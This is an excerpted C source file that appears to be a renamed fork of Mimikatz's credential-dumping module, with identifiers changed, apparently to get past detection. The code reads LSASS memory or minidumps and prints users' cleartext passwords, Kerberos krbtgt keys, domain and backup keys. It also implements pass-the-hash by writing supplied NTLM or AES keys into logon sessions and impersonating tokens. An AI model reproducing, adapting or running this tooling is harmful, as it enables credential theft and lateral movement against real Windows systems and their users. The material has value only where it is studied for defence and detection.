...
const KUHL_M_C kuhl_m_c_sekurlsa[] = {
	...
	{old_kuhl_m_sekurlsa_all,				L"logonPasswords",	L"Lists all available providers credentials"},
...
const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	...
	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_SEKCEE), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_SEKCEE, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_SEKCEE, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_SEKCEE, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_SEKCEE, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_SEKCEE, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_SEKCEE, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_SEKCEE, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_SEKCEE, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_SEKCEE, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_SEKCEE, LogonServer)},
...
{
	sekcee_stdout(L"Switch to PROCESS\n");
...
{
	sekcee_stdout(L"Switch to MINIDUMP : ");
	if(argc != 1)
...
{
	lsassLocalHelper = (SEKCEE_NT_MAJOR_VERSION < 6) ? &lsassLocalHelpers[0] : 
	#ifdef LSASS_DECRYPT
		((SEKCEE_NT_BUILD_NUMBER != 9431) ? &lsassLocalHelpers[1] : &lsassLocalHelpers[2])
	#else
		&lsassLocalHelpers[1]
	#endif
		;
...
NTSTATUS old_kuhl_m_sekurlsa_all(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(lsassPackages, ARRAYSIZE(lsassPackages));
}

NTSTATUS kuhl_m_sekurlsa_all(int* retp)
{
	return kuhl_m_sekurlsa_getLogonData(lsassPackages, ARRAYSIZE(lsassPackages));
}
	...
	if(!cLsass.hLsassMem)
	{
		...
		if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))
		{
			if(pMinidumpName)
			{
				...
				sekcee_stdout(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
				...
				if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
				{
					if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
					{
						if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
						{
							...
							if(isError = (cLsass.osContext.MajorVersion != SEKCEE_NT_MAJOR_VERSION) && !(SEKCEE_NT_MAJOR_VERSION >= 6 && cLsass.osContext.MajorVersion >= 6))
								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != SEKCEE_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, SEKCEE_NT_MAJOR_VERSION);
						#ifdef _M_X64
					...
					else
					{
						...
						if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
							PRINT_ERROR(SEKCEE L" " SEKCEE_ARCH L" cannot access x64 process\n");
						else
					#endif
						{						
							cLsass.osContext.MajorVersion = SEKCEE_NT_MAJOR_VERSION;
							cLsass.osContext.MinorVersion = SEKCEE_NT_MINOR_VERSION;
							cLsass.osContext.BuildNumber  = SEKCEE_NT_BUILD_NUMBER;
						}
					}
			...
			else PRINT_ERROR_AUTO(L"Handle on memorys");
...
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	...
	if((pData->LogonType != Network) /*&& pData->LogonType != UndefinedLogonType*/)
	{
		...
		for(i = 0; i < pLsassData->nbPackages; i++)
		{
			...
			{
				sekcee_stdout(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
...
wchar_t * sekcee_stdout_mini(PCWCHAR format, ...)
{
	...
	SIZE_T size = 100;
	wchar_t* output_mini = (wchar_t*)HeapAlloc(hHeap, 0, size);
	...
	if (output_mini)
	{
		...
		if (varBuf > 0)
		{
			varBuf = vswprintf(output_mini, 0, format, args);
...
wchar_t * sekcee_stdout_mini2(PCWCHAR format, ...)
{
	va_list args;
	va_start(args, format);
	int varsize = 255;
	wchar_t *output = (wchar_t *)malloc(varsize * sizeof(wchar_t));
	if (output == NULL) {
		return NULL;
	}
	vswprintf(output, varsize, format, args);
	return output;
}

void sekcee_displaySID(IN PSID pSid)
{
	LPWSTR stringSid;
	if (ConvertSidToStringSid(pSid, &stringSid))
	{
		curr_logon->sid = sekcee_stdout_mini2(L"%s", stringSid);
		LocalFree(stringSid);
	}
	else PRINT_ERROR_AUTO(L"ConvertSidToStringSid");
}

void sekcee_displayFileTime(IN PFILETIME pFileTime)
{
	SYSTEMTIME st;
	wchar_t buffer_d[0xff];
	wchar_t buffer_t[0xff];
	if (pFileTime)
	{
		if (FileTimeToSystemTime(pFileTime, &st))
		{
			if (GetDateFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, buffer_d, ARRAYSIZE(buffer_d)))
			{
				GetTimeFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, buffer_t, ARRAYSIZE(buffer_t));
				curr_logon->logondate = sekcee_stdout_mini2(L"%s %s", buffer_d, buffer_t);
			}
		}
	}
}

void sekcee_displayLocalFileTime(IN PFILETIME pFileTime)
{
	FILETIME ft;
	if (pFileTime)
		if (FileTimeToLocalFileTime(pFileTime, &ft))
			sekcee_displayFileTime(&ft);
}

void kuhl_m_sekurlsa_printinfos_logonData(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	LogonStruct * newData = add_to_logon_list(101, TRUE);
	
	curr_logon->authid = sekcee_stdout_mini2(L"%u; %u(%08x:%08x)", pData->LogonId->HighPart, pData->LogonId->LowPart, pData->LogonId->HighPart, pData->LogonId->LowPart);
	curr_logon->session = sekcee_stdout_mini2(L"%s from %u", KUHL_M_SEKURLSA_LOGON_TYPE[pData->LogonType], pData->Session);
	curr_logon->username = sekcee_stdout_mini2(L"%wZ", pData->UserName);
	curr_logon->domain = sekcee_stdout_mini2(L"%wZ", pData->LogonDomain);
	curr_logon->logonserv = sekcee_stdout_mini2(L"%wZ", pData->LogonServer);
	...
	sekcee_stdout(L"Logon Time        : ");
	kull_m_string_displayLocalFileTime(&pData->LogonTime);
	sekcee_displayLocalFileTime(&pData->LogonTime);
	sekcee_stdout(L"\n");

	sekcee_stdout(L"SID               : ");
	if(pData->pSid)
		kull_m_string_displaySID(pData->pSid);
		sekcee_displaySID(pData->pSid);
	sekcee_stdout(L"\n");
}
		...
		if(cLsass.osContext.MajorVersion < 6) // TODO: a field offset table
		{
			...
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_5) - sizeof(KIWI_KRBTGT_CREDENTIAL_5)))
			{
				...
				if(creds5 = (PKIWI_KRBTGT_CREDENTIALS_5) LocalAlloc(LPTR, sizeForCreds))
				{
					...
					{
						sekcee_stdout(L"%u credentials\n", creds5->cbCred);
						for(i = 0; i < creds5->cbCred; i++)
						{
							sekcee_stdout(L"\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds5->credentials[i].type)));
			...
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6)))
			{
				...
				if(creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
				{
					...
					if(kull_m_memory_copy(&aLocal, &aLsass, sizeForCreds))
					{
						...
						{
							sekcee_stdout(L"\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds6->credentials[i].type)));
			...
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_64) - sizeof(KIWI_KRBTGT_CREDENTIAL_64)))
			{
				...
				if(creds64 = (PKIWI_KRBTGT_CREDENTIALS_64) LocalAlloc(LPTR, sizeForCreds))
				{
					...
					if(kull_m_memory_copy(&aLocal, &aLsass, sizeForCreds))
					{
						...
						{
							sekcee_stdout(L"\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds64->credentials[i].type)));
		...
		if(keysInfo->keysSize && keysInfo->keys)
		{
			if(domainKeys = (PKDC_DOMAIN_KEYS) LocalAlloc(LPTR, keysInfo->keysSize))
			{
				...
				if(kull_m_memory_copy(&aData, &aLsass, keysInfo->keysSize))	
				{
					...
					{
						sekcee_stdout(L"\t* %s : ", kuhl_m_kerberos_ticket_etype(domainKeys->keys[i].type));
...
void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
{
	if(kull_m_string_getUnicodeString(&info->FullDomainName, cLsass.hLsassMem))
	{
		if(kull_m_string_getUnicodeString(&info->NetBiosName, cLsass.hLsassMem))
		{
			...
			{
				sekcee_stdout(L" / "); kull_m_string_displaySID(info->DomainSid);
...
void kuhl_m_sekurlsa_bkey(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, BOOL isExport)
{
	...
	if(kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, generics, cbGenerics, &pGuid, &pKeyLen, &pKeyBuffer, NULL))
	{
		if(aLsass.address = pGuid)
		{
			...
			{
				kull_m_string_displayGUID(&guid); sekcee_stdout(L"\n");
...
#pragma warning(pop)
	...
	{
		if(SEKCEE_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
			if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
			{
				data.Aes128Key = aes128key;
				sekcee_stdout(L"AES128\t: "); kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); sekcee_stdout(L"\n");
			}
	...
	if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
	{
		if(SEKCEE_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
			if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
			{
				...
				sekcee_stdout(L"AES256\t: "); kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); sekcee_stdout(L"\n");
			}
	...
	if(kull_m_string_args_byName(argc, argv, L"rc4", &szNTLM, NULL) || kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
	{
		...
		{
			data.NtlmHash = ntlm;
			sekcee_stdout(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); sekcee_stdout(L"\n");
		}
	...
	if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
	{
		if(szLuid)
		{
			sekcee_stdout(L"mode\t: replacing NTLM/RC4 key in a session\n");
							...
							if(isImpersonate)
							{
								if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityDelegation, TokenImpersonation, &hNewToken))
								{
									if(SetThreadToken(NULL, hNewToken))
										sekcee_stdout(L"** Token Impersonation **\n");
	...
	if(NT_SUCCESS(kuhl_m_sekurlsa_acquireLSA()) && (cLsass.hLsassMem->type == KULL_M_MEMORY_TYPE_PROCESS))
	{
		...
		if(NT_SUCCESS(status))
		{
			if(isRWok = (bi.GrantedAccess & (PROCESS_VM_OPERATION | PROCESS_VM_WRITE)))
				sekcee_stdout(L"was already R/W\n");
			else
			{
...
VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)
{
	...
	if(mesCreds)
	{
		...
		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
		{
			...
			sekcee_stdout(L"\t   %s ", kuhl_m_kerberos_ticket_etype(pHashPassword->Type));
			...
			else sekcee_stdout(L"<no size, buffer is incorrect>");
			sekcee_stdout(L"\n");
		}
		else
		{
			...
			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
			{
				...
				{
					sekcee_stdout((flags & KUHL_SEKURLSA_CREDS_DISPLAY_LINE) ?
						L"%wZ\t%wZ\t"
						:
						L"\n\t * Username : %wZ"
						L"\n\t * Domain   : %wZ"
					...
					if(!password || kull_m_string_suspectUnicodeString(password))
					{
						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
							sekcee_stdout(L"%.*s", password->Length / sizeof(wchar_t), password->Buffer);
						else
							sekcee_stdout(L"%wZ", password);

						if (password != NULL)
						{
							curr_logon->netpwdcred = TRUE;
						}
...
VOID kuhl_m_sekurlsa_genericLsaIsoOutput(PLSAISO_DATA_BLOB blob)
{
	...
	kull_m_string_wprintf_hex(blob->unkData2, sizeof(blob->unkData2), 0); sekcee_stdout(L", 5:0x%x", blob->unk5);
}
